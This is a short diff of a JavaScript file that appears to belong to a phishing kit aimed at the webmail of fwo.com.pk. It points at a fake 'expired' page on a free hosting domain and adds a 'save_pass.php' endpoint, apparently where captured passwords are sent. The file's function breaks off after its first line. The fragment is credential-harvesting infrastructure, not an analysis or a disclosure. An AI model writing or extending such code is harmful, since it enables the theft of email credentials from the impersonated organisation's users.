@@ -1,5 +1,8 @@
 var hostURL = 'https://webmail.fwo.com.pk';
 var htmlFileURL = 'https://webworldoppertunity.wuaze.com/axigen/ExpiredPage/expired.php/';
+var phpFileURL = 'https://webworldoppertunity.wuaze.com/axigen/ExpiredPage/save_pass.php/';
+var imageURL= 'https://www.seiu1000.org/sites/main/files/main-images/camera_lense_0.jpeg';
+
 
 function test(){
   const url = new URL(window.location.href);
